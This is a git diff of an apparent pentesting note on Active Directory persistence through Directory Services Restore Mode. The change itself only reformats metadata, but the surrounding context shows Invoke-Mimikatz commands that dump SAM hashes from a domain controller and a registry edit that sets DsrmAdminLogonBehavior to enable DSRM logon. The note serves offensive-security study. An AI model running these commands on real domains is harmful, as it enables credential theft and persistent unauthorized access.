@@ -1,5 +1,11 @@
 ---
-{"publish":true,"created":"2025-02-23T23:53:09.697+05:30","modified":"2025-08-15T16:42:05.853+05:30","published":"2025-08-15T16:42:05.853+05:30","tags":["persistence"],"cssclasses":[]}
+publish: true
+created: 2025-02-23T23:53:09.697+05:30
+modified: 2025-08-15T16:42:05.853+05:30
+published: 2025-08-15T16:42:05.853+05:30
+tags:
+  - persistence
+cssclasses: []
 ---
 
 - Directory Services Restore Mode
@@ -22,4 +28,3 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername domain-
 Enter-PSSession -ComputerName domain-controller
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
 ```
-
